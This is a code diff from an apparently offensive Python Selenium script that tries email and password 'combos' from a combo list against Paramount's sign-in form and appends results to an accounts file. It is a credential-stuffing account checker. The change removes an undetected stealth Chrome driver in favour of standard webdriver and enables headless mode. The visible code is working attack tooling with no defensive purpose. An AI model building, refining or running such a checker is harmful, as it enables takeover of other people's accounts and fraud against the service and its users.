@@ -1,6 +1,5 @@
 import time
 
-import seleniumwire.undetected_chromedriver as stealthdriver
 from combo_splitters.split_combos import ComboSplitter
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -30,17 +29,15 @@ def paramount_():
 	index = 0
 	browser_options = Options()
 	browser_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36')
-	#browser_options.add_argument('--headless=new')
+	browser_options.add_argument('--headless=new')
 	while index < len(users):
 		with open(plain_directory + '/accounts/paramount_acc', 'a') as account_results:
 			try:
 				print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
-				browser = stealthdriver.Chrome(options=browser_options)
-				browser.set_window_size(500,700)
+				browser = webdriver.Chrome(options=browser_options)
+				browser.set_window_size(500, 700)
 				browser.get(page)
 				browser.set_page_load_timeout(10)
-
-				cookies = browser.get_cookies()
 				email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
 				password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
 				sign_in_button = browser.find_element(By.XPATH, '//*[@id="sign-in-form"]/div/div[3]/button')
